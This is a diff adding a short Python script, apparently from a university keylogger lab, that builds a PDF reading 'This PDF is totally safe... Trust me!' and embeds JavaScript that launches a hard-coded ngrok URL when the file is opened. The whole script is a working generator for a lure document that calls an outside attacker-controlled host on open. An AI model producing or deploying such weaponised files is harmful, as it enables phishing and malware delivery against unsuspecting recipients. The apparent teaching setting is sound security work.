@@ -1,0 +1,41 @@
+from reportlab.pdfgen import canvas  # Importing the canvas module from reportlab to create PDFs
+from reportlab.lib.pagesizes import letter  # Importing letter size for PDF page dimensions
+from PyPDF2 import PdfReader, PdfWriter  # Importing PdfReader and PdfWriter from PyPDF2 for reading and writing PDFs
+from io import BytesIO  # Importing BytesIO to handle in-memory byte streams
+import os  # Importing os module to handle directory and file operations
+
+# Define directory and file paths
+pdf_dir = r"C:\Users\LJMU Recycled Kit\OneDrive - Liverpool John Moores University\Desktop\Keyloggers\PDF"
+os.makedirs(pdf_dir, exist_ok=True)  # Create the directory if it doesn't exist
+pdf_file = os.path.join(pdf_dir, "Hello.pdf")  # Define the path for the output PDF file
+
+# Create a PDF in memory
+packet = BytesIO()  # Create a BytesIO object to hold the PDF data in memory
+can = canvas.Canvas(packet, pagesize=letter)  # Create a canvas object for PDF creation with letter page size
+can.drawString(100, 750, "This PDF is totally safe... Trust me!")  # Draw text on the PDF at specified coordinates
+can.save()  # Save the canvas content to the BytesIO object
+
+# Move to the beginning of the BytesIO buffer
+packet.seek(0)  # Reset the buffer position to the start
+
+# Read the PDF created by ReportLab
+new_pdf = PdfReader(packet)  # Read the PDF content from the BytesIO buffer
+
+# Create a PdfWriter object and add the new PDF page
+output_pdf = PdfWriter()  # Create a PdfWriter object to write the final PDF
+output_pdf.add_page(new_pdf.pages[0])  # Add the first page of the new PDF to the PdfWriter
+
+# Replace '<YOUR_NGROK_URL>' with Ngrok URL
+ngrok_url = 'https://55ed-31-205-78-116.ngrok-free.app'  # Replace this with Ngrok URL
+
+# Create JavaScript to open a URL
+js = f"""
+app.launchURL('{ngrok_url}', true);  # JavaScript to launch the specified URL when the PDF is opened
+"""
+
+# Add JavaScript to the PDF
+output_pdf.add_js(js)  # Add the JavaScript action to the PdfWriter
+
+# Write the final PDF to a file
+with open(pdf_file, "wb") as f:  # Open the output file in binary write mode
+    output_pdf.write(f)  # Write the PdfWriter content to the file
